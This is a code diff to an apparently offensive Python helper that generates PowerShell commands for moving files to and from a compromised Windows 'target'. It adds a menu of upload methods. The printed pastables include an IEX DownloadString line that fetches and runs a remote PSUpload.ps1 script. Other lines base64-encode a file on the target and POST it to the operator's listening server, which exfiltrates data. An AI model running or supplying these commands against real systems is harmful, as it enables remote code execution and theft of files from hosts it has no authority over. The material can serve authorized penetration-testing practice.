@@ -269,10 +269,10 @@ def transfer_to(args):
 
         # ON WINDOWS POWERSHELL LESS THAN 8191 CHARACTERS
         if args.os == 'windows':
-            finalcmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
-            if len(finalcmd) <= 8191:
+            cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
+            if len(cmd) <= 8191:
                 print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
-                print(finalcmd)
+                print(cmd)
                 print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
             else:
                 print('[!] cmd.exe has a maximum string length of 8,191 characters.')
@@ -349,13 +349,13 @@ def transfer_from(args):
             file_absolute_path = get_absolute_path()
             filename = file_absolute_path.split('\\')[-1]
             while True:
-                finalcmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))'
-                finalcmd2 = 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
+                cmd = '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))'
+                cmd2 = 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
                 print('\n[================== RUN ON TARGET ==================]\n')
                 print('# GENERATE BASE64 STRING')
-                print(finalcmd)
+                print(cmd)
                 print('\n# GENERATE MD5 CHECKSUM')
-                print(finalcmd2)
+                print(cmd2)
                 print('\n[================ END RUN ON TARGET ================]\n')
                 print('[?] Paste generated Base64 string here: ', end='')
                 try:
@@ -394,18 +394,27 @@ def transfer_from(args):
                 print('[!] Failed to start upload server')
                 sys.exit(1)
 
-            # GET FILENAME AND ABSOLUTE PATH
+            # GET FILENAME AND ABSOLUTE PATH ON TARGET
             file_absolute_path = get_absolute_path()
             filename = file_absolute_path.split('\\')[-1]
 
-            # TARGET PASTABLES
-            finalcmd = 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')'
-            finalcmd2 = 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
+            # SELECT WHICH POWERSHELL UPLOAD METHOD
+            entrymsg = '[?] Which PowerShell upload method to use on target: '
+            choice = dynamic_populated_choices(entrymsg, PSFrom_Methods)
+
+            # GENERATE TARGET PASTABLES
+            if choice == 'PSUpload.ps1':
+                cmd = '# DOWNLOAD PSUPLOAD.PS1\n'
+                cmd += 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')\n'
+                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
+                cmd += 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
+            elif choice == 'Base64':
+                cmd = '# GENERATE BASE64 AND STORE IT AS A VARIABLE\n'
+                cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
+                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
+                cmd += 'Invoke-WebRequest -Uri https://' + listen_ip + '/ -Method POST -Body $b64'
             print('\n[================== RUN ON TARGET ==================]\n')
-            print('# DOWNLOAD PSUPLOAD.PS1')
-            print(finalcmd)
-            print('\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER')
-            print(finalcmd2)
+            print(cmd)
             print('\n[================ END RUN ON TARGET ================]\n')
 
             # TERMINATE UPLOAD SERVER WHEN DONE
